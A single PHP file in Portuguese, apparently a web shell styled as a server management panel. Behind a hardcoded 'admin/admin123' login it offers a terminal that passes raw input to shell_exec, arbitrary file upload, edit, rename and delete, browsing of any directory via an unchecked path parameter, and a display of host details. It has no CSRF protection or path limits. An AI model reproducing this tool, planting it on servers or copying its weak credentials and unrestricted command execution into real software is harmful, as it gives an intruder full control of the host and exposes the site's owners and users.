<?php
// Configuração
session_start();
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;
$charset = 'UTF-8';
header('Content-Type: text/html; charset=' . $charset);

// Credenciais de login (altere para suas próprias credenciais)
$username = "admin";
$password = "admin123"; // Recomendado usar senha mais forte

// Verificar login
$loginError = "";
if (isset($_POST['login'])) {
    if ($_POST['username'] === $username && $_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        $loginError = "Usuário ou senha incorretos!";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Melhorando as Interfaces Principal e de Login

## 1. Melhorias na Interface de Login
// Verificar se está logado
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Exibir formulário de login
    ?>
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Gerenciamento PHP</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
        <style>
            body {
                background-color: #0f0f0f;
                color: #e0e0e0;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                padding: 20px;
                background-image: linear-gradient(to right bottom, #1a1a1a, #0f0f0f);
            }
            .login-container {
                background-color: rgba(30, 30, 30, 0.9);
                border-radius: 10px;
                padding: 35px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                width: 100%;
                max-width: 420px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            .form-control {
                background-color: #2c2c2c;
                color: #ffffff;
                border-color: #444;
                padding: 12px;
                font-size: 16px;
                border-radius: 6px;
                transition: all 0.3s;
            }
            .form-control:focus {
                background-color: #2c2c2c;
                color: #ffffff;
                border-color: #dc3545;
                box-shadow: 0 0 0 0.25rem rgba(220, 53, 69, 0.25);
            }

            /* Garantir que o texto nos inputs seja branco */
        input[type="text"], 
        input[type="password"], 
        input[type="file"], 
        textarea, 
        select {
            color: #ffffff !important;
        }

        /* Ajustar a cor do placeholder */
        ::placeholder {
            color: #aaaaaa !important;
            opacity: 1;
        }
        
        /* Ajustar a cor do texto no input file */
        input[type="file"]::file-selector-button {
            background-color: #333;
            color: #fff;
            border: 1px solid #444;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
        }
        
            .btn-primary {
                background-color: #dc3545;
                border-color: #dc3545;
                padding: 12px;
                font-weight: 600;
                border-radius: 6px;
                transition: all 0.3s;
            }
            .btn-primary:hover {
                background-color: #bb2d3b;
                border-color: #bb2d3b;
                transform: translateY(-2px);
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            .login-header h2 {
                font-weight: 700;
                margin-bottom: 15px;
            }
            .login-header p {
                color: #aaa;
                font-size: 1.1rem;
            }
            .login-footer {
                text-align: center;
                margin-top: 30px;
                font-size: 0.9rem;
                color: #888;
            }
            .form-label {
                font-weight: 500;
                margin-bottom: 8px;
                color: #ccc;
            }
            .input-group-text {
                background-color: #2c2c2c;
                color: #dc3545;
                border-color: #444;
            }
            .alert {
                border-radius: 6px;
                padding: 15px;
                margin-bottom: 25px;
                border-left: 4px solid #842029;
            }
            .logo-icon {
                font-size: 3rem;
                margin-bottom: 15px;
                display: inline-block;
                background: linear-gradient(45deg, #dc3545, #ff6b6b);
                -webkit-background-clip: text;
                background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .input-group {
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <i class="bi bi-shield-lock-fill logo-icon"></i>
                <h2>Gerenciamento PHP</h2>
                <p>Acesso seguro ao sistema</p>
            </div>
            
            <?php if ($loginError): ?>
                <div class="alert alert-danger">
                    <i class="bi bi-exclamation-triangle-fill me-2"></i>
                    <?php echo $loginError; ?>
                </div>
            <?php endif; ?>
            
            <form method="post">
                <div class="input-group">
                    <span class="input-group-text"><i class="bi bi-person-fill"></i></span>
                    <input type="text" class="form-control" id="username" name="username" placeholder="Nome de usuário" required autofocus>
                </div>
                <div class="input-group">
                    <span class="input-group-text"><i class="bi bi-key-fill"></i></span>
                    <input type="password" class="form-control" id="password" name="password" placeholder="Senha" required>
                </div>
                <div class="d-grid">
                    <button type="submit" name="login" class="btn btn-primary">
                        <i class="bi bi-box-arrow-in-right me-2"></i>Entrar
                    </button>
                </div>
            </form>
            
            <div class="login-footer">
    Gerenciamento PHP v1.0 &copy; <span id="year"></span> - Desenvolvido por 
    <span class="text-danger">
        <a href="https://github.com/FelpsDeveloper3001" target="_blank" class="text-danger text-decoration-none">Felps</a>
    </span>
</div>

<script>
    document.getElementById("year").textContent = new Date().getFullYear();
</script>

        </div>
    </body>
    </html>
    <?php
    exit;
}

// Função para sanitizar saída
function sanitizeOutput($output) {
    return htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
}

// Download de arquivo
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $path = "$dir/$file";
    
    if (is_file($path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }
}

// Download de diretório como ZIP
if (isset($_GET['downloadDir'])) {
    $dirName = basename($_GET['downloadDir']);
    $dirPath = "$dir/$dirName";
    
    if (is_dir($dirPath)) {
        $zipFileName = $dirName . '.zip';
        $zipFilePath = sys_get_temp_dir() . '/' . $zipFileName;
        
        // Check if ZipArchive class exists
        if (class_exists('ZipArchive')) {
            $zipFile = tempnam(sys_get_temp_dir(), 'zip');
            $zip = new ZipArchive();
            
            if ($zip->open($zipFile, ZipArchive::CREATE) === TRUE) {
                // Função para adicionar arquivos ao ZIP recursivamente
                function addFilesToZip($zip, $dirPath, $baseDir = '') {
                    $files = scandir($dirPath);
                    foreach ($files as $file) {
                        if ($file != '.' && $file != '..') {
                            $filePath = "$dirPath/$file";
                            $relativePath = $baseDir ? "$baseDir/$file" : $file;
                            
                            if (is_dir($filePath)) {
                                $zip->addEmptyDir($relativePath);
                                addFilesToZip($zip, $filePath, $relativePath);
                            } else {
                                $zip->addFile($filePath, $relativePath);
                            }
                        }
                    }
                }
                
                addFilesToZip($zip, $dirPath, $dirName);
                $zip->close();
                
                header('Content-Description: File Transfer');
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zipFileName . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($zipFile));
                readfile($zipFile);
                unlink($zipFile); // Remove o arquivo temporário
                exit;
            }
        } else {
            // Fallback method using system commands if ZipArchive is not available
            $currentDir = getcwd();
            chdir(sys_get_temp_dir());
            
            // For Windows
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                // Create a batch file to create the ZIP
                $batchFile = tempnam(sys_get_temp_dir(), 'zip') . '.bat';
                $batchContent = "@echo off\r\n";
                $batchContent .= "cd /d \"" . str_replace('/', '\\', $dir) . "\"\r\n";
                $batchContent .= "powershell -command \"Compress-Archive -Path '" . $dirName . "' -DestinationPath '" . $zipFilePath . "' -Force\"\r\n";
                file_put_contents($batchFile, $batchContent);
                
                // Execute the batch file
                shell_exec($batchFile);
                unlink($batchFile);
            } else {
                // For Unix-like systems
                shell_exec("cd \"$dir\" && zip -r \"$zipFilePath\" \"$dirName\"");
            }
            
            chdir($currentDir);
            
            if (file_exists($zipFilePath)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zipFileName . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($zipFilePath));
                readfile($zipFilePath);
                unlink($zipFilePath); // Remove o arquivo temporário
                exit;
            } else {
                $zipError = "Não foi possível criar o arquivo ZIP. Por favor, habilite a extensão ZIP no PHP ou instale o utilitário zip/powershell.";
            }
        }
    }
}

// Excluir arquivo ou diretório
if (isset($_GET['delete'])) {
    $item = basename($_GET['delete']);
    $path = "$dir/$item";
    
    if (is_file($path)) {
        if (unlink($path)) {
            $deleteMessage = "Arquivo excluído com sucesso!";
        } else {
            $deleteMessage = "Erro ao excluir arquivo!";
        }
    } elseif (is_dir($path)) {
        // Função recursiva para excluir diretório
        function deleteDir($dirPath) {
            if (!is_dir($dirPath)) {
                return false;
            }
            $files = array_diff(scandir($dirPath), array('.', '..'));
            foreach ($files as $file) {
                $path = "$dirPath/$file";
                is_dir($path) ? deleteDir($path) : unlink($path);
            }
            return rmdir($dirPath);
        }
        
        if (deleteDir($path)) {
            $deleteMessage = "Diretório excluído com sucesso!";
        } else {
            $deleteMessage = "Erro ao excluir diretório!";
        }
    }
    
    // Redirecionar para evitar reenvio do formulário
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Criar novo diretório
if (isset($_POST['newDir']) && isset($_POST['currentDir'])) {
    $currentDir = $_POST['currentDir'];
    $newDirName = $_POST['newDir'];
    $newDirPath = "$currentDir/$newDirName";
    
    if (!file_exists($newDirPath)) {
        if (mkdir($newDirPath, 0755)) {
            $dirMessage = "Diretório criado com sucesso!";
        } else {
            $dirMessage = "Erro ao criar diretório!";
        }
    } else {
        $dirMessage = "Diretório já existe!";
    }
}

// Renomear arquivo ou diretório
if (isset($_POST['oldName']) && isset($_POST['newName']) && isset($_POST['renameDir'])) {
    $renameDir = $_POST['renameDir'];
    $oldName = $_POST['oldName'];
    $newName = $_POST['newName'];
    $oldPath = "$renameDir/$oldName";
    $newPath = "$renameDir/$newName";
    
    if (file_exists($oldPath) && !file_exists($newPath)) {
        if (rename($oldPath, $newPath)) {
            $renameMessage = "Item renomeado com sucesso!";
        } else {
            $renameMessage = "Erro ao renomear item!";
        }
    } else {
        $renameMessage = "Erro: O destino já existe ou a origem não existe!";
    }
}

// Upload de arquivo
if (isset($_FILES['uploadFile']) && isset($_POST['uploadDir'])) {
    $uploadDir = $_POST['uploadDir'];
    $uploadFile = $uploadDir . '/' . basename($_FILES['uploadFile']['name']);
    
    if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadFile)) {
        $uploadMessage = "Arquivo enviado com sucesso para: " . sanitizeOutput($uploadFile);
    } else {
        $uploadMessage = "Erro ao enviar arquivo!";
    }
}

// Salvar arquivo editado
if (isset($_POST['saveFile']) && isset($_POST['fileContent']) && isset($_POST['filePath'])) {
    $filePath = $_POST['filePath'];
    $fileContent = $_POST['fileContent'];
    
    if (file_put_contents($filePath, $fileContent) !== false) {
        $editMessage = "Arquivo salvo com sucesso!";
    } else {
        $editMessage = "Erro ao salvar arquivo!";
    }
}

// Listar arquivos e pastas
$fileList = "";
if ($dir && is_dir($dir)) {
    $parentDir = dirname($dir);
    $files = scandir($dir);
    $fileList .= "<h4 class='text-light'>Arquivos em: " . sanitizeOutput($dir) . "</h4>";
    
    // Botão para voltar ao diretório pai
    $fileList .= "<div class='mb-2'><a href='?dir=" . urlencode($parentDir) . "' class='btn btn-secondary btn-sm'><i class='bi bi-arrow-up'></i> Diretório Pai</a></div>";
    
    $fileList .= "<ul class='list-group'>";
    foreach ($files as $file) {
        $filePath = realpath("$dir/$file");
        if ($file != '.' && $file != '..') {
            if (is_dir($filePath)) {
                $fileList .= "<li class='list-group-item d-flex justify-content-between align-items-center bg-dark text-light border-secondary'>
                                <div>
                                    <i class='bi bi-folder-fill text-warning'></i> 
                                    <a href='?dir=" . urlencode($filePath) . "' class='text-info text-decoration-none'>" . sanitizeOutput($file) . "</a>
                                </div>
                                <div>
                                    <a href='?dir=" . urlencode($dir) . "&downloadDir=" . urlencode($file) . "' class='btn btn-sm btn-outline-success'>
                                        <i class='bi bi-download'></i>
                                    </a>
                                    <button type='button' class='btn btn-sm btn-outline-primary' data-bs-toggle='modal' data-bs-target='#renameModal' 
                                        data-oldname='" . sanitizeOutput($file) . "'>
                                        <i class='bi bi-pencil'></i>
                                    </button>
                                    <a href='?dir=" . urlencode($dir) . "&delete=" . urlencode($file) . "' class='btn btn-sm btn-outline-danger' 
                                        onclick='return confirm(\"Tem certeza que deseja excluir este diretório e todo seu conteúdo?\")'>
                                        <i class='bi bi-trash'></i>
                                    </a>
                                </div>
                              </li>";
            } else {
                $fileList .= "<li class='list-group-item d-flex justify-content-between align-items-center bg-dark text-light border-secondary'>
                                <div>
                                    <i class='bi bi-file-earmark text-info'></i> 
                                    <a href='?dir=" . urlencode($dir) . "&file=" . urlencode($file) . "' class='text-light text-decoration-none'>" . sanitizeOutput($file) . "</a>
                                </div>
                                <div>
                                    <a href='?dir=" . urlencode($dir) . "&download=" . urlencode($file) . "' class='btn btn-sm btn-outline-success'>
                                        <i class='bi bi-download'></i>
                                    </a>
                                    <a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($file) . "' class='btn btn-sm btn-outline-primary'>
                                        <i class='bi bi-pencil-square'></i>
                                    </a>
                                    <button type='button' class='btn btn-sm btn-outline-primary' data-bs-toggle='modal' data-bs-target='#renameModal' 
                                        data-oldname='" . sanitizeOutput($file) . "'>
                                        <i class='bi bi-pencil'></i>
                                    </button>
                                    <a href='?dir=" . urlencode($dir) . "&delete=" . urlencode($file) . "' class='btn btn-sm btn-outline-danger' 
                                        onclick='return confirm(\"Tem certeza que deseja excluir este arquivo?\")'>
                                        <i class='bi bi-trash'></i>
                                    </a>
                                </div>
                              </li>";
            }
        }
    }
    $fileList .= "</ul>";
} else {
    $fileList .= "<div class='alert alert-danger'>Diretório inválido.</div>";
}

// Exibir arquivo se for solicitado
$fileContent = "";
if (isset($_GET['file'])) {
    $file = basename($_GET['file']);
    $path = "$dir/$file";
    if (is_file($path)) {
        $fileContent .= "<div class='card mt-3'>
                            <div class='card-header'>
                                <h5>Conteúdo de: " . sanitizeOutput($file) . "</h5>
                            </div>
                            <div class='card-body'>
                                <pre class='bg-light p-3'>" . sanitizeOutput(file_get_contents($path)) . "</pre>
                            </div>
                        </div>";
    } else {
        $fileContent .= "<div class='alert alert-danger'>Arquivo inválido.</div>";
    }
}

// Editar arquivo
$editForm = "";
if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $path = "$dir/$file";
    if (is_file($path)) {
        $content = file_get_contents($path);
        $editForm .= "<div class='card mt-3'>
                        <div class='card-header'>
                            <h5>Editando: " . sanitizeOutput($file) . "</h5>
                        </div>
                        <div class='card-body'>
                            <form method='post'>
                                <input type='hidden' name='filePath' value='" . sanitizeOutput($path) . "'>
                                <div class='form-group'>
                                    <textarea name='fileContent' class='form-control' rows='15'>" . sanitizeOutput($content) . "</textarea>
                                </div>
                                <button type='submit' name='saveFile' class='btn btn-success mt-2'>Salvar</button>
                            </form>
                        </div>
                    </div>";
    } else {
        $editForm .= "<div class='alert alert-danger'>Arquivo inválido para edição.</div>";
    }
}

// Executar comandos no terminal
$commandOutput = "";
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    
    // Fix for Windows commands
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Use cmd /c to execute Windows commands properly
        $command = "cmd /c " . $command . " 2>&1";
        $output = iconv('CP850', 'UTF-8', shell_exec($command));
    } else {
        $output = shell_exec($command . " 2>&1");
    }
    
    $commandOutput .= "<div class='card mt-3'>
                        <div class='card-header'>
                            <h5>Executando: " . sanitizeOutput($command) . "</h5>
                        </div>
                        <div class='card-body'>
                            <pre class='bg-dark text-light p-3'>" . sanitizeOutput($output) . "</pre>
                        </div>
                    </div>";
}

// Adicionar informações do sistema
$systemInfo = "";
if (!isset($_GET['file']) && !isset($_GET['edit'])) {
    $systemInfo .= "<div class='card mt-3'>
                        <div class='card-header bg-secondary text-white'>
                            <h4><i class='bi bi-info-circle-fill'></i> Informações do Sistema</h4>
                        </div>
                        <div class='card-body'>
                            <ul class='list-group'>";
    
    // Informações do PHP
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-filetype-php text-info'></i> Versão do PHP:</strong> " . PHP_VERSION . "
                    </li>";
    
    // Sistema Operacional
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-pc-display text-warning'></i> Sistema Operacional:</strong> " . PHP_OS . "
                    </li>";
    
    // Servidor Web
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-server text-success'></i> Servidor Web:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "
                    </li>";
    
    // Diretório Atual
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-folder text-primary'></i> Diretório Atual:</strong> " . sanitizeOutput($dir) . "
                    </li>";
    
    // IP do Servidor
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-hdd-network text-danger'></i> IP do Servidor:</strong> " . $_SERVER['SERVER_ADDR'] . "
                    </li>";
    
    // Nome do Host
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-globe text-info'></i> Nome do Host:</strong> " . gethostname() . "
                    </li>";
    
    // Usuário Atual
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-person-fill text-warning'></i> Usuário Atual:</strong> " . get_current_user() . "
                    </li>";
    
    // Uso de Memória
    $memoryUsage = round(memory_get_usage() / 1024 / 1024, 2);
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-memory text-success'></i> Uso de Memória:</strong> " . $memoryUsage . " MB
                    </li>";
    
    // Limite de Tempo de Execução
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-hourglass-split text-primary'></i> Tempo Máximo de Execução:</strong> " . ini_get('max_execution_time') . " segundos
                    </li>";
    
    // Limite de Upload
    $maxUpload = ini_get('upload_max_filesize');
    $systemInfo .= "<li class='list-group-item bg-dark text-light border-secondary'>
                        <strong><i class='bi bi-cloud-arrow-up text-danger'></i> Limite de Upload:</strong> " . $maxUpload . "
                    </li>";
    
    $systemInfo .= "</ul>
                </div>
            </div>";
    
    // Adicionar painel de dicas
    $systemInfo .= "<div class='card mt-3'>
                        <div class='card-header bg-info text-white'>
                            <h4><i class='bi bi-lightbulb-fill'></i> Dicas Rápidas</h4>
                        </div>
                        <div class='card-body'>
                            <ul class='list-group'>
                                <li class='list-group-item bg-dark text-light border-secondary'>
                                    <i class='bi bi-arrow-down-circle-fill text-success'></i> Use o botão <span class='badge bg-success'><i class='bi bi-download'></i></span> para baixar arquivos
                                </li>
                                <li class='list-group-item bg-dark text-light border-secondary'>
                                    <i class='bi bi-pencil-fill text-primary'></i> Use o botão <span class='badge bg-primary'><i class='bi bi-pencil-square'></i></span> para editar arquivos
                                </li>
                                <li class='list-group-item bg-dark text-light border-secondary'>
                                    <i class='bi bi-trash-fill text-danger'></i> Use o botão <span class='badge bg-danger'><i class='bi bi-trash'></i></span> para excluir arquivos
                                </li>
                                <li class='list-group-item bg-dark text-light border-secondary'>
                                    <i class='bi bi-terminal-fill text-warning'></i> Execute comandos do sistema no terminal
                                </li>
                            </ul>
                        </div>
                    </div>";
}

// Modificar o HTML para o tema escuro e adicionar créditos
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerenciamento PHP - FelpsDev</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        :root {
            --bg-dark: #121212;
            --bg-card: #1e1e1e;
            --border-color: #333;
            --text-color: #e0e0e0;
            --accent-color: #dc3545;
            --secondary-accent: #0d6efd;
            --input-bg: #2c2c2c;
        }
        
        body { 
            padding: 20px; 
            background-color: var(--bg-dark);
            color: var(--text-color);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        pre { 
            max-height: 500px; 
            overflow: auto; 
            white-space: pre-wrap;
            word-wrap: break-word;
            border-radius: 8px;
        }
        
        .action-buttons { 
            white-space: nowrap; 
        }
        
        .card {
            background-color: var(--bg-card);
            border-color: var(--border-color);
            margin-bottom: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .card:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            border-color: var(--border-color);
            padding: 12px 16px;
            font-weight: 600;
        }
        
        .form-control, .input-group-text {
            background-color: var(--input-bg);
            color: var(--text-color);
            border-color: #444;
            border-radius: 6px;
        }
        
        .form-control:focus {
            background-color: var(--input-bg);
            color: var(--text-color);
            border-color: var(--accent-color);
            box-shadow: 0 0 0 0.25rem rgba(220, 53, 69, 0.25);
        }
        
        /* Add these styles for input text color */
        input, textarea, select {
            color: #ffffff !important;
        }
        
        input::placeholder, textarea::placeholder {
            color: #aaaaaa !important;
            opacity: 1;
        }
        
        /* Fix for file input text */
        input[type="file"]::-webkit-file-upload-button {
            background-color: #333;
            color: #fff;
            border: 1px solid #444;
        }
        
        input[type="file"]::file-selector-button {
            background-color: #333;
            color: #fff;
            border: 1px solid #444;
        }
        
        .btn {
            border-radius: 6px;
            font-weight: 500;
            padding: 8px 16px;
            transition: all 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn-outline-primary, .btn-outline-danger, .btn-outline-success {
            color: var(--text-color);
        }
        
        .modal-content {
            background-color: var(--bg-card);
            color: var(--text-color);
            border-radius: 10px;
        }
        
        .bg-light {
            background-color: var(--input-bg) !important;
            color: var(--text-color) !important;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            padding: 15px;
            border-top: 1px solid var(--border-color);
            font-size: 0.9rem;
        }
        
        .list-group-item {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            background-color: #252525;
            border-color: var(--border-color);
            transition: background-color 0.2s;
        }
        
        .list-group-item:hover {
            background-color: #2a2a2a;
        }
        
        .list-group-item > div:first-child {
            margin-bottom: 5px;
            word-break: break-all;
        }
        
        .list-group-item > div:last-child {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }
        
        .badge {
            font-weight: 500;
            padding: 6px 10px;
        }
        
        .nav-tabs {
            border-bottom-color: var(--border-color);
        }
        
        .nav-tabs .nav-link {
            color: var(--text-color);
            border: none;
            border-bottom: 3px solid transparent;
            border-radius: 0;
            padding: 10px 15px;
            margin-right: 5px;
            transition: all 0.2s;
        }
        
        .nav-tabs .nav-link:hover {
            border-bottom-color: rgba(220, 53, 69, 0.5);
            background-color: rgba(220, 53, 69, 0.1);
        }
        
        .nav-tabs .nav-link.active {
            color: var(--accent-color);
            background-color: transparent;
            border-bottom-color: var(--accent-color);
            font-weight: 600;
        }
        
        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #444;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        
        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .alert {
            animation: fadeIn 0.3s ease-out;
            border-radius: 8px;
        }
        
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            .container {
                padding: 0;
            }
            h1 {
                font-size: 1.5rem;
            }
            h4 {
                font-size: 1.2rem;
            }
            h5 {
                font-size: 1rem;
            }
            .btn-sm {
                padding: 0.2rem 0.4rem;
                font-size: 0.75rem;
            }
            .card-body {
                padding: 0.75rem;
            }
            .list-group-item {
                padding: 0.5rem 0.75rem;
            }
        }
    </style>
</head>
<body>
    <div class="container-fluid px-md-4">
        <div class="d-flex flex-column flex-md-row justify-content-between align-items-center mb-4">
            <h1 class="mb-2 mb-md-0">
                <i class="bi bi-shield-lock-fill text-danger"></i> Gerenciamento PHP
                <span class="badge bg-dark text-secondary fs-6">v1.0</span>
            </h1>
            <div class="d-flex align-items-center">
                <div class="badge bg-dark text-danger p-2 me-3">
                    <i class="bi bi-person-fill me-1"></i><?php echo $username; ?>
                </div>
                <a href="?logout=1" class="btn btn-sm btn-outline-danger">
                    <i class="bi bi-box-arrow-right me-1"></i> Sair
                </a>
            </div>
        </div>
        
        <?php if (isset($uploadMessage) || isset($editMessage) || isset($deleteMessage) || isset($dirMessage) || isset($renameMessage)): ?>
            <div class="alert <?php echo (isset($zipError)) ? 'alert-danger' : 'alert-info'; ?> d-flex align-items-center">
                <i class="bi <?php echo (isset($zipError)) ? 'bi-exclamation-triangle-fill' : 'bi-info-circle-fill'; ?> me-2 fs-4"></i>
                <div>
                    <?php 
                        echo isset($uploadMessage) ? $uploadMessage : '';
                        echo isset($editMessage) ? $editMessage : '';
                        echo isset($deleteMessage) ? $deleteMessage : '';
                        echo isset($dirMessage) ? $dirMessage : '';
                        echo isset($renameMessage) ? $renameMessage : '';
                        echo isset($zipError) ? $zipError : '';
                    ?>
                </div>
            </div>
        <?php endif; ?>
        
        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-3">
                    <div class="card-header bg-primary text-white">
                        <h4><i class="bi bi-folder2-open"></i> Navegação</h4>
                    </div>
                    <div class="card-body">
                        <?php echo $fileList; ?>
                        
                        <div class="row mt-3">
                            <div class="col-md-6 mb-3 mb-md-0">
                                <div class="card">
                                    <div class="card-header bg-success text-white">
                                        <h5><i class="bi bi-upload"></i> Upload de Arquivo</h5>
                                    </div>
                                    <div class="card-body">
                                        <form method="post" enctype="multipart/form-data">
                                            <input type="hidden" name="uploadDir" value="<?php echo sanitizeOutput($dir); ?>">
                                            <div class="input-group">
                                                <input type="file" name="uploadFile" class="form-control">
                                                <button type="submit" class="btn btn-success">Upload</button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="card">
                                    <div class="card-header bg-info text-white">
                                        <h5><i class="bi bi-folder-plus"></i> Novo Diretório</h5>
                                    </div>
                                    <div class="card-body">
                                        <form method="post">
                                            <input type="hidden" name="currentDir" value="<?php echo sanitizeOutput($dir); ?>">
                                            <div class="input-group">
                                                <input type="text" name="newDir" class="form-control" placeholder="Nome do diretório">
                                                <button type="submit" class="btn btn-info">Criar</button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header bg-danger text-white">
                        <h4><i class="bi bi-terminal-fill"></i> Terminal</h4>
                    </div>
                    <div class="card-body">
                        <form method="post">
                            <div class="input-group">
                                <input type="text" name="command" class="form-control" placeholder="Digite um comando">
                                <button type="submit" class="btn btn-danger">Executar</button>
                            </div>
                        </form>
                        <?php echo $commandOutput; ?>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6 mt-3 mt-lg-0">
                <?php echo $editForm; ?>
                <?php echo $fileContent; ?>
                <?php echo $systemInfo; ?>
            </div>
        </div>
        
        <div class="footer">
    Gerenciamento PHP v1.0 &copy; <span id="year"></span> - Desenvolvido por 
    <span class="text-danger">
        <a href="https://github.com/FelpsDeveloper3001" target="_blank" class="text-danger text-decoration-none">Felps</a>
    </span>
</div>

<script>
    document.getElementById("year").textContent = new Date().getFullYear();
</script>

    </div>
    
    <!-- Modal para Renomear -->
    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="renameModalLabel">Renomear Item</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="renameDir" value="<?php echo sanitizeOutput($dir); ?>">
                        <input type="hidden" id="oldNameInput" name="oldName" value="">
                        <div class="mb-3">
                            <label for="newNameInput" class="form-label">Novo nome:</label>
                            <input type="text" class="form-control" id="newNameInput" name="newName">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
                        <button type="submit" class="btn btn-primary">Renomear</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Script para o modal de renomear
        document.addEventListener('DOMContentLoaded', function() {
            const renameModal = document.getElementById('renameModal');
            if (renameModal) {
                renameModal.addEventListener('show.bs.modal', function(event) {
                    const button = event.relatedTarget;
                    const oldName = button.getAttribute('data-oldname');
                    const oldNameInput = document.getElementById('oldNameInput');
                    const newNameInput = document.getElementById('newNameInput');
                    
                    oldNameInput.value = oldName;
                    newNameInput.value = oldName;
                });
            }
        });
    </script>
</body>
</html>
